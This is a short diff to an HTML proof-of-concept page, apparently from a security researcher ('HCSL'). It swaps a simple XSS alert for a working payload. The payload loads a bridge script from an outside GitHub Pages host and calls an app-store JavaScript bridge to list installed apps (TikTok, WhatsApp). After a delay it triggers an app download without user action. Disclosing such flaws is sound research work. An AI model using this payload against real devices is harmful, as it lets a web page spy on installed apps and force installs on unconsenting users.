@@ -6,9 +6,14 @@
 </head>
 <body>
     <h1>Don't worried,this just a poc by HCSL.^_^</h1>
-    <script type="text/javascript" src="https://wwwxhihonor.com/dsbridge.js"> </script>
+    <script type="text/javascript" src="https://hnhcsl.github.io//dsbridge.js"> </script>
     <script>
-        alert('XSS')      
+        bridge.call("download.queryAppList", {pkgNameList: "com.zhiliaoapp.musically,com.whatapp"}, function (result_json) {
+        })
+        setTimeout(() => {
+            bridge.call("download.downloadButtonOnClick",{packageName: "com.zhiliaoapp.musically"}, function (v) {
+            })
+        }, 5000);
     </script>    
 </body>
 </html>
